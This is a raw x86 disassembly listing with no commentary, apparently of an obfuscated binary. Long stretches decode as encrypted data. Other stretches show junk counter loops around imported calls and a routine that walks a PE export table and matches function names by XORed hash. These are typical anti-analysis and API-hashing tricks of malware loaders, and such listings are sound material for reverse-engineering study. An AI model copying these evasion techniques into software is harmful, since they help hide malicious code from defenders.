  419f40:	enter  0xf42f,0x47
  419f44:	shr    bh,cl
  419f46:	xchg   DWORD PTR [ebp+0x17ba1a55],esp
  419f4c:	mov    ecx,fs
  419f4e:	(bad)  
  419f4f:	hlt    
  419f50:	cld    
  419f51:	inc    edx
  419f52:	mov    esi,0xef0ce27f
  419f57:	dec    edx
  419f58:	xchg   DWORD PTR [edx],eax
  419f5a:	ins    DWORD PTR es:[edi],dx
  419f5b:	mov    dh,0x7f
  419f5d:	or     al,0xa
  419f5f:	cmp    BYTE PTR [esi-0x34],0x3b
  419f63:	mov    ebx,0x7ee4932b
  419f68:	mov    esi,0x220f85ed
  419f6d:	in     al,dx
  419f6e:	xchg   edx,eax
  419f6f:	mov    esp,0x40606565
  419f74:	add    BYTE PTR [eax],ch
  419f76:	push   ecx
  419f77:	hlt    
  419f78:	das    
  419f79:	inc    eax
  419f7a:	mov    eax,ds:0xab616469
  419f7f:	call   0x6c12:0x37fbb424
  419f86:	pop    edi
  419f87:	dec    ebp
  419f88:	(bad)  
  419f89:	push   ds
  419f8a:	pusha  
  419f8b:	mov    al,BYTE PTR [edx+0x5c07bc2d]
  419f91:	sahf   
  419f92:	or     eax,0x6cfd25ac
  419f97:	adc    al,0x27
  419f99:	test   BYTE PTR [edi+ecx*8],dh
  419f9c:	adc    edx,DWORD PTR [eax+0x5f]
  419f9f:	ror    BYTE PTR [edi],1
  419fa1:	test   DWORD PTR [ecx-0x7efffffa],edx
  419fa7:	add    eax,0x42a7c5
  419fac:	popa   
  419fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fae:	inc    edx
  419faf:	add    bh,bh
  419fb1:	jne    0x419fbb
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0xca
  419fdd:	add    al,0xb1
  419fdf:	icebp  
  419fe0:	adc    bl,0x7f
  419fe3:	js     0x419ff5
  419fe5:	jle    0x41a05f
  419fe7:	js     0x419fd8
  419fe9:	adc    ebx,DWORD PTR ds:0xc6d5867
  419fef:	adc    DWORD PTR [esi],esp
  419ff1:	sub    BYTE PTR [ebx],dl
  419ff3:	pop    es
  419ff4:	loopne 0x41a03b
  419ff6:	clc    
  419ff7:	nop
  419ff8:	and    cl,ch
  419ffa:	jmp    0x385db757
  419fff:	bound  edx,QWORD PTR [edi+0x6e]
  41a002:	mov    cl,0x83
  41a004:	test   edi,ecx
  41a006:	sbb    ebx,DWORD PTR [ecx]
  41a008:	pushf  
  41a009:	push   ss
  41a00a:	int    0x6c
  41a00c:	fmul   DWORD PTR [eax+ecx*4+0x1f33c9f5]
  41a013:	bnd ret 0x9dcd
  41a017:	movhlps xmm5,xmm4
  41a01a:	pop    edi
  41a01b:	jo     0x41a03f
  41a01d:	jnp    0x419faa
  41a01f:	mov    ds:0xa70d89a3,al
  41a024:	jecxz  0x41a01a
  41a026:	adc    esi,ecx
  41a028:	jg     0x41a030
  41a02a:	mov    edx,0xae37d90d
  41a02f:	in     eax,0x42
  41a031:	retf   
  41a032:	outs   dx,BYTE PTR ds:[esi]
  41a033:	xchg   DWORD PTR [edi-0x34],edi
  41a036:	push   ebp
  41a037:	fsubr  QWORD PTR [edi+0x1f]
  41a03a:	jae    0x41a043
  41a03c:	pop    edx
  41a03d:	mov    BYTE PTR [ecx],ah
  41a03f:	lods   al,BYTE PTR ds:[esi]
  41a040:	push   ebp
  41a041:	jae    0x41a06b
  41a043:	ret    0x356f
  41a046:	int3   
  41a047:	pop    ebx
  41a048:	jo     0x41a0b6
  41a04a:	inc    eax
  41a04b:	jnp    0x41a05c
  41a04d:	jge    0x41a00e
  41a04f:	rcr    BYTE PTR [edi],0xab
  41a052:	out    dx,eax
  41a053:	mov    bl,0x29
  41a055:	sbb    esp,edi
  41a057:	retf   0x4807
  41a05a:	shr    BYTE PTR [edi],1
  41a05c:	cli    
  41a05d:	aas    
  41a05e:	(bad)  
  41a05f:	adc    ah,BYTE PTR [esi+0x3d5eb60a]
  41a065:	xchg   ebp,eax
  41a066:	cdq    
  41a067:	jmp    DWORD PTR [eax+ebp*8]
  41a06a:	xor    dh,BYTE PTR [eax]
  41a06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a06d:	es jp  0x41a0af
  41a070:	xor    BYTE PTR [ebx+ebp*8-0x66],dl
  41a074:	jmp    0xa76b:0x34f3d24e
  41a07b:	dec    eax
  41a07c:	retf   0xc687
  41a07f:	add    BYTE PTR [edx+0x59b8f920],bl
  41a085:	inc    edi
  41a086:	out    dx,al
  41a087:	daa    
  41a088:	shl    DWORD PTR [edi+0x1c33b509],0xaa
  41a08f:	imul   esp,DWORD PTR [ebp-0x4b42fbad],0x40011a53
  41a099:	mov    edx,0x3883a58b
  41a09e:	in     eax,dx
  41a09f:	cmp    cl,bh
  41a0a1:	sahf   
  41a0a2:	mov    eax,ds:0xca0f4b67
  41a0a7:	in     eax,dx
  41a0a8:	scas   al,BYTE PTR es:[edi]
  41a0a9:	fisttp WORD PTR [eax+0x2e]
  41a0ac:	push   0x668cae1
  41a0b1:	loopne 0x41a0cc
  41a0b3:	pop    ebp
  41a0b4:	icebp  
  41a0b5:	mov    ebx,0xf9dc9d94
  41a0ba:	adc    esi,DWORD PTR [edx]
  41a0bc:	push   ebx
  41a0bd:	pop    ebp
  41a0be:	or     DWORD PTR [ebx-0x12],0x71b1c62e
  41a0c5:	cmp    esp,ecx
  41a0c7:	clc    
  41a0c8:	jns    0x41a126
  41a0ca:	shr    DWORD PTR gs:[eax-0x48],1
  41a0ce:	cld    
  41a0cf:	mov    WORD PTR [ecx+eiz*4-0x3297c2f],cs
  41a0d6:	mov    esi,0x2918621
  41a0db:	out    dx,al
  41a0dc:	jle    0x41a14e
  41a0de:	fs cli 
  41a0e0:	dec    ecx
  41a0e1:	adc    edx,DWORD PTR [eax]
  41a0e3:	push   es
  41a0e4:	xor    DWORD PTR [esi+0x2c],0x3d
  41a0e8:	icebp  
  41a0e9:	mov    edi,0x4404f37e
  41a0ee:	pop    ebx
  41a0ef:	popf   
  41a0f0:	jns    0x41a0d7
  41a0f2:	loop   0x41a089
  41a0f4:	stos   BYTE PTR es:[edi],al
  41a0f5:	sub    ecx,esi
  41a0f7:	jb     0x41a12b
  41a0f9:	fsub   st(1),st
  41a0fb:	push   edi
  41a0fc:	xchg   esp,eax
  41a0fd:	mov    eax,0x96c0609
  41a102:	sahf   
  41a103:	cmp    DWORD PTR [edi+0xe],esp
  41a106:	sub    eax,0x8efd1dc3
  41a10b:	xor    DWORD PTR [ecx-0x5c],0xffffffd0
  41a10f:	ins    BYTE PTR es:[di],dx
  41a111:	pop    esi
  41a112:	mov    bl,0xe8
  41a114:	das    
  41a115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a116:	adc    ch,BYTE PTR [edi+esi*8]
  41a119:	adc    ebp,ecx
  41a11b:	(bad)  
  41a11c:	test   eax,0xa0df2654
  41a121:	add    ch,BYTE PTR [edi+ecx*2-0x79191191]
  41a128:	das    
  41a129:	push   eax
  41a12a:	and    al,0xc1
  41a12c:	daa    
  41a12d:	outs   dx,DWORD PTR ds:[esi]
  41a12e:	cmp    DWORD PTR [ecx-0x441d272f],0xcae3b672
  41a138:	jmp    0x41a19d
  41a13a:	and    al,0x62
  41a13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a13d:	xor    dl,bl
  41a13f:	dec    edi
  41a140:	(bad)  
  41a141:	call   0x9294:0x7f821d55
  41a148:	adc    dh,BYTE PTR [esi]
  41a14a:	mov    DWORD PTR ds:0xbe6bbad4,0x75d1593b
  41a154:	mov    edi,0x82fc6545
  41a159:	ret    0x20d
  41a15c:	in     eax,0x5
  41a15e:	add    ah,BYTE PTR [ebp+0x63711ffe]
  41a164:	lods   al,BYTE PTR ds:[esi]
  41a165:	mov    DWORD PTR [ebp-0x2c],esp
  41a168:	and    BYTE PTR [ebp-0x2e39b7de],bh
  41a16e:	and    DWORD PTR [ebx+ecx*2],0x3a0c9633
  41a175:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41a177:	or     eax,0x2f9c5e82
  41a17c:	adc    esi,ebx
  41a17e:	cld    
  41a17f:	jp     0x41a167
  41a181:	sahf   
  41a182:	and    eax,0xd470e40c
  41a187:	jg     0x41a1a7
  41a189:	jnp    0x41a207
  41a18b:	cmp    DWORD PTR [ecx+0xe209d91],ecx
  41a191:	pop    es
  41a192:	(bad)  
  41a194:	jno    0x41a20d
  41a196:	clc    
  41a197:	xchg   DWORD PTR [ecx],ebp
  41a199:	pop    edi
  41a19a:	(bad)  
  41a19b:	in     eax,0xee
  41a19d:	jnp    0x41a189
  41a19f:	aam    0x4c
  41a1a1:	aad    0x30
  41a1a3:	pop    esi
  41a1a4:	xchg   esp,eax
  41a1a5:	jmp    0x41a1e5
  41a1a7:	inc    DWORD PTR [edx+0x5e2ad90a]
  41a1ad:	push   ebx
  41a1ae:	sub    eax,0x3ce71dae
  41a1b3:	xchg   esi,eax
  41a1b4:	xchg   DWORD PTR [eax],ebp
  41a1b6:	enter  0xc3ca,0x6b
  41a1ba:	mov    dl,0x7c
  41a1bc:	cmp    ecx,DWORD PTR [edi]
  41a1be:	ret    
  41a1bf:	bound  edx,QWORD PTR [eax+0x58724872]
  41a1c5:	pop    esp
  41a1c6:	add    cl,bh
  41a1c8:	ds cli 
  41a1ca:	push   edi
  41a1cb:	fdiv   QWORD PTR [ebp-0x35afd0c9]
  41a1d1:	loop   0x41a19e
  41a1d3:	aad    0x88
  41a1d5:	jo     0x41a17c
  41a1d7:	jmp    0x41a1ef
  41a1d9:	ss pop ebx
  41a1db:	sar    ah,cl
  41a1dd:	leave  
  41a1de:	lds    eax,FWORD PTR [ebx]
  41a1e0:	out    0x9f,al
  41a1e2:	jns    0x41a250
  41a1e4:	sti    
  41a1e5:	add    al,0xf7
  41a1e7:	lahf   
  41a1e8:	sahf   
  41a1e9:	nop
  41a1ea:	sbb    cl,bh
  41a1ec:	fwait
  41a1ed:	jp     0x41a211
  41a1ef:	jae    0x41a220
  41a1f1:	retf   0xb6d3
  41a1f4:	in     al,dx
  41a1f5:	arpl   WORD PTR [edx+0x296251a],ax
  41a1fb:	icebp  
  41a1fc:	cmp    DWORD PTR [edi],eax
  41a1fe:	push   cs
  41a1ff:	sub    eax,0x8bfc458b
  41a204:	dec    ebp
  41a205:	loopne 0x41a1ce
  41a207:	add    eax,0x42a7b1
  41a20c:	sbb    al,0x0
  41a20e:	add    BYTE PTR [eax],al
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a223
  41a293:	lahf   
  41a294:	imul   edi
  41a296:	cwde   
  41a297:	sar    DWORD PTR [edi+0x78],1
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a2e1
  41a29f:	fnsave [esi]
  41a2a1:	jno    0x41a24b
  41a2a3:	pop    es
  41a2a4:	xor    DWORD PTR es:[edx+0x28afd389],0x2bc03a19
  41a2af:	dec    ebp
  41a2b0:	outs   dx,BYTE PTR ds:[esi]
  41a2b1:	test   BYTE PTR [edi+0x8e8bfc6],dl
  41a2b7:	fstp   DWORD PTR ds:0x935564ba
  41a2bd:	or     DWORD PTR [esi-0x43],esi
  41a2c0:	dec    edi
  41a2c1:	mov    bh,0x66
  41a2c3:	jmp    0xd4490ae
  41a2c8:	mov    ch,0xe3
  41a2ca:	stos   DWORD PTR es:[edi],eax
  41a2cb:	mov    ebx,0x8587d6b8
  41a2d0:	mov    ecx,0x693a8532
  41a2d5:	sub    ecx,ebx
  41a2d7:	mov    ds:0x627ad753,al
  41a2dc:	adc    esi,edi
  41a2de:	lock pop eax
  41a2e0:	shl    BYTE PTR [eax+0x5690d399],0x9a
  41a2e7:	call   0x2e03:0xeb45f599
  41a2ee:	xor    al,0x72
  41a2f0:	addr16 pop es
  41a2f2:	loopne 0x41a371
  41a2f4:	imul   edi,DWORD PTR [edi+0x69],0xad2d01bd
  41a2fb:	xlat   BYTE PTR ds:[ebx]
  41a2fc:	push   esp
  41a2fd:	jb     0x41a2ba
  41a2ff:	outs   dx,DWORD PTR ds:[esi]
  41a300:	aaa    
  41a301:	popa   
  41a302:	(bad)  
  41a303:	dec    ecx
  41a305:	dec    esp
  41a306:	pop    es
  41a307:	imul   eax,DWORD PTR [esi-0x247ceacf],0xffffffe0
  41a30e:	dec    edx
  41a30f:	lock retf 0xdd83
  41a313:	xor    ecx,DWORD PTR [eax-0x64aaa482]
  41a319:	fadd   QWORD PTR [esi-0xd7687f8]
  41a31f:	and    dl,ch
  41a321:	loop   0x41a364
  41a323:	push   0xffffff93
  41a325:	aam    0x90
  41a327:	add    DWORD PTR [eax-0x388e3745],edx
  41a32d:	pop    edx
  41a32e:	out    dx,eax
  41a32f:	mov    DWORD PTR [esi-0x53735220],esp
  41a335:	cmp    DWORD PTR [edi-0x181cbd17],0xcc9ff258
  41a33f:	xchg   edx,eax
  41a340:	push   es
  41a341:	sbb    al,0xd7
  41a343:	(bad)  
  41a344:	out    dx,eax
  41a345:	int    0xbf
  41a347:	and    eax,0xc3f4b406
  41a34c:	xor    BYTE PTR [ebx],0x38
  41a34f:	or     ebp,DWORD PTR [ebx+0x6e8c4f48]
  41a355:	push   edx
  41a356:	test   BYTE PTR [edi+0x6a],bl
  41a359:	outs   dx,BYTE PTR ds:[esi]
  41a35a:	stos   BYTE PTR es:[edi],al
  41a35b:	inc    edi
  41a35c:	inc    esi
  41a35d:	sub    BYTE PTR [esi-0x4e],0x93
  41a361:	sub    ch,bl
  41a363:	jne    0x41a345
  41a365:	adc    DWORD PTR [ecx-0x12],ecx
  41a368:	arpl   WORD PTR [edi],bx
  41a36a:	dec    esp
  41a36b:	xbegin 0xdaf7da61
  41a371:	or     ebx,edi
  41a373:	xchg   ebp,eax
  41a374:	mov    al,ds:0xd173680b
  41a379:	ja     0x41a3cd
  41a37b:	xchg   esi,eax
  41a37c:	iret   
  41a37d:	jmp    0x317b:0x552f9c13
  41a384:	lahf   
  41a385:	pop    ebp
  41a386:	mul    BYTE PTR [ebx+0x59]
  41a389:	sub    DWORD PTR [ebx-0x25],edi
  41a38c:	xor    BYTE PTR [edi],0x89
  41a38f:	jg     0x41a39a
  41a391:	push   0x23
  41a393:	aam    0x79
  41a395:	sub    ebx,DWORD PTR [edi+ecx*1+0x7a89f750]
  41a39c:	iret   
  41a39d:	icebp  
  41a39e:	and    BYTE PTR [edx-0x4f894392],al
  41a3a4:	mov    ds:0xaab12d3f,al
  41a3a9:	xchg   edi,eax
  41a3aa:	dec    edx
  41a3ab:	nop
  41a3ac:	int    0x5
  41a3ae:	test   DWORD PTR [edi-0x19],esi
  41a3b1:	ins    BYTE PTR es:[edi],dx
  41a3b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3b3:	mov    edx,0xab2f50c2
  41a3b8:	or     ah,bl
  41a3ba:	outs   dx,DWORD PTR ds:[esi]
  41a3bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3bc:	das    
  41a3bd:	pop    esp
  41a3be:	jno    0x41a3b8
  41a3c0:	mov    BYTE PTR [edx],bh
  41a3c2:	lods   eax,DWORD PTR ds:[esi]
  41a3c3:	inc    ebp
  41a3c4:	xchg   esi,eax
  41a3c5:	lods   eax,DWORD PTR ds:[esi]
  41a3c6:	popf   
  41a3c7:	adc    eax,0x85848ca4
  41a3cc:	ret    
  41a3cd:	xor    DWORD PTR [ecx],esi
  41a3cf:	js     0x41a3c7
  41a3d1:	mov    esi,0x7190cc2b
  41a3d6:	out    0xef,eax
  41a3d8:	not    DWORD PTR [esi]
  41a3da:	sbb    cl,BYTE PTR [ebp-0x1b0dc2cc]
  41a3e0:	xchg   edi,eax
  41a3e1:	iret   
  41a3e2:	ins    DWORD PTR es:[edi],dx
  41a3e3:	mov    al,ds:0x39aac2ed
  41a3e8:	inc    ebp
  41a3e9:	mov    ebp,0x4515c520
  41a3ee:	push   edx
  41a3ef:	(bad)  
  41a3f0:	les    ebp,FWORD PTR [edx-0x71]
  41a3f3:	arpl   WORD PTR [ebx+0x185783c],ax
  41a3f9:	ret    0x1aef
  41a3fc:	retf   
  41a3fd:	xlat   BYTE PTR ds:[ebx]
  41a3fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3ff:	xchg   esi,eax
  41a400:	pop    DWORD PTR [esp+edx*4-0x77eee383]
  41a407:	ds inc esi
  41a409:	jb     0x41a410
  41a40b:	jg     0x41a3b3
  41a40d:	fs retf 
  41a40f:	and    BYTE PTR [ecx-0x359c4ae5],dl
  41a415:	cs push ds
  41a417:	add    BYTE PTR ds:0xea09be61,dl
  41a41d:	fadd   DWORD PTR [esi-0x33]
  41a420:	icebp  
  41a421:	xchg   ecx,eax
  41a422:	in     al,dx
  41a423:	icebp  
  41a424:	stos   BYTE PTR es:[edi],al
  41a425:	in     al,0xbc
  41a427:	pop    ebx
  41a428:	mov    al,ds:0x7a2d76a3
  41a42d:	jnp    0x41a426
  41a42f:	pop    ss
  41a430:	cmp    edi,DWORD PTR [ebp+ebx*1-0x614cde47]
  41a437:	mov    ah,dl
  41a439:	popf   
  41a43a:	pusha  
  41a43b:	xchg   edx,eax
  41a43c:	clc    
  41a43d:	(bad)  
  41a43f:	jmp    0x5ad2:0xa399a340
  41a446:	out    dx,eax
  41a447:	add    eax,0x1c56d2fe
  41a44c:	jl     0x41a3de
  41a44e:	cmp    eax,eax
  41a450:	sub    DWORD PTR [ecx],ebp
  41a452:	pusha  
  41a453:	xor    BYTE PTR [edi],dl
  41a455:	stos   BYTE PTR es:[edi],al
  41a456:	mov    eax,cs
  41a458:	fwait
  41a459:	gs xchg ebp,eax
  41a45b:	std    
  41a45c:	aam    0xef
  41a45e:	repnz ins DWORD PTR es:[edi],dx
  41a460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a461:	jmp    0xfbca0ea1
  41a466:	sub    DWORD PTR [esi-0x5534fab7],esi
  41a46c:	sbb    esp,DWORD PTR [ecx-0x6a]
  41a46f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a470:	dec    ecx
  41a471:	out    dx,al
  41a472:	out    dx,al
  41a473:	adc    al,0xbe
  41a475:	mov    dl,0x8
  41a477:	lock lods al,BYTE PTR ds:[esi]
  41a479:	push   es
  41a47a:	mov    bl,0xdc
  41a47c:	inc    edi
  41a47d:	or     al,0x75
  41a47f:	leave  
  41a480:	mov    ebx,0x4799c7fd
  41a485:	enter  0x222e,0xd4
  41a489:	ins    DWORD PTR es:[edi],dx
  41a48a:	retf   0x75e3
  41a48d:	cmp    ch,BYTE PTR [edi+edi*4+0x15ca7a1d]
  41a494:	jge    0x41a4eb
  41a496:	fld    QWORD PTR [edi-0x16]
  41a499:	scas   al,BYTE PTR es:[edi]
  41a49a:	call   0x76bab463
  41a49f:	sbb    DWORD PTR [ebp-0x21],edi
  41a4a2:	shr    BYTE PTR [esi],cl
  41a4a4:	dec    ebx
  41a4a5:	pushf  
  41a4a6:	or     eax,0xd1004f96
  41a4ab:	push   ds
  41a4ac:	fiadd  DWORD PTR [esi-0x546e3c17]
  41a4b2:	mov    eax,0x8979c49b
  41a4b7:	inc    ebp
  41a4b8:	in     al,dx
  41a4b9:	mov    DWORD PTR ds:0x42a75d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a75d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	gs dec edx
  41a690:	mov    WORD PTR [edi+0x787fd7b0],fs
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a702
  41a69b:	adc    DWORD PTR [eax+esi*8],0x412a22a3
  41a6a2:	popf   
  41a6a3:	mov    dl,0x16
  41a6a5:	hlt    
  41a6a6:	mov    cl,0x36
  41a6a8:	outs   dx,BYTE PTR ds:[esi]
  41a6a9:	jge    0x41a6c9
  41a6ab:	adc    eax,DWORD PTR [edx]
  41a6ad:	cld    
  41a6ae:	or     BYTE PTR [ecx+0x71],bl
  41a6b1:	fbstp  TBYTE PTR [edi+0x3d]
  41a6b4:	push   0xfffffff6
  41a6b6:	adc    BYTE PTR [ebp+0x31bdb9d7],cl
  41a6bc:	inc    ebp
  41a6bd:	std    
  41a6be:	xor    eax,0x9c275470
  41a6c3:	xchg   ebx,eax
  41a6c4:	or     al,dl
  41a6c6:	add    ch,BYTE PTR [ebx]
  41a6c8:	mov    ds:0x7eb70b98,al
  41a6cd:	imul   ebp,DWORD PTR [esi],0x5f7e3a30
  41a6d3:	push   0xc81f3745
  41a6d8:	in     eax,dx
  41a6d9:	data16 jmp 0x41a6c9
  41a6dc:	xchg   esi,ecx
  41a6de:	push   ebp
  41a6df:	and    al,0xed
  41a6e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6e2:	test   esp,edx
  41a6e4:	adc    ebp,DWORD PTR [eax]
  41a6e6:	repz mov ebx,0xd168be06
  41a6ec:	imul   eax,DWORD PTR [ecx],0x4c
  41a6ef:	dec    esp
  41a6f0:	jbe    0x41a72d
  41a6f2:	jecxz  0x41a772
  41a6f4:	enter  0xc397,0xfe
  41a6f8:	jge    0x41a725
  41a6fa:	ins    BYTE PTR es:[edi],dx
  41a6fb:	lahf   
  41a6fc:	jecxz  0x41a6c4
  41a6fe:	or     eax,0x2cd4dea2
  41a703:	inc    esp
  41a704:	adc    ch,BYTE PTR [esi-0x37]
  41a707:	mov    ch,0xef
  41a709:	shl    BYTE PTR [ecx-0x62],1
  41a70c:	lahf   
  41a70d:	lds    esp,FWORD PTR [ebx+0x5aa36372]
  41a713:	in     eax,0xfa
  41a715:	add    BYTE PTR [ecx-0x7868ed75],0x89
  41a71c:	daa    
  41a71d:	(bad)  
  41a71f:	dec    eax
  41a720:	fsubr  QWORD PTR [ebx]
  41a722:	aad    0xdf
  41a724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a725:	jns    0x41a77d
  41a727:	jns    0x41a75d
  41a729:	xor    esp,DWORD PTR [eax]
  41a72b:	or     eax,0x1e59b718
  41a730:	jbe    0x41a75b
  41a732:	and    DWORD PTR [ebx-0xac5ca73],eax
  41a738:	xchg   esi,eax
  41a739:	pop    eax
  41a73a:	fst    QWORD PTR [ecx]
  41a73c:	cmp    eax,0xe69efdb3
  41a741:	dec    ebx
  41a742:	cmp    esi,DWORD PTR [ebx+0x567b6d55]
  41a748:	cmc    
  41a749:	inc    ecx
  41a74a:	push   edx
  41a74b:	or     al,0x7a
  41a74d:	xchg   ebp,eax
  41a74e:	rcr    DWORD PTR [edx+0x157cf309],1
  41a754:	push   edx
  41a755:	and    al,0xa4
  41a757:	int    0xf6
  41a759:	iret   
  41a75a:	sub    al,bh
  41a75c:	aaa    
  41a75d:	ja     0x41a780
  41a75f:	pop    ss
  41a760:	dec    edi
  41a761:	inc    edx
  41a762:	sub    eax,0x841d3194
  41a767:	imul   esi,esi,0x21aa86f6
  41a76d:	adc    al,0x49
  41a76f:	scas   ax,WORD PTR es:[edi]
  41a771:	jns    0x41a701
  41a773:	push   edi
  41a774:	push   edx
  41a775:	sub    ebx,DWORD PTR [esp+edi*2-0x23]
  41a779:	out    dx,eax
  41a77a:	pop    ecx
  41a77b:	inc    esi
  41a77c:	data16 and al,0x7c
  41a77f:	mov    ss,eax
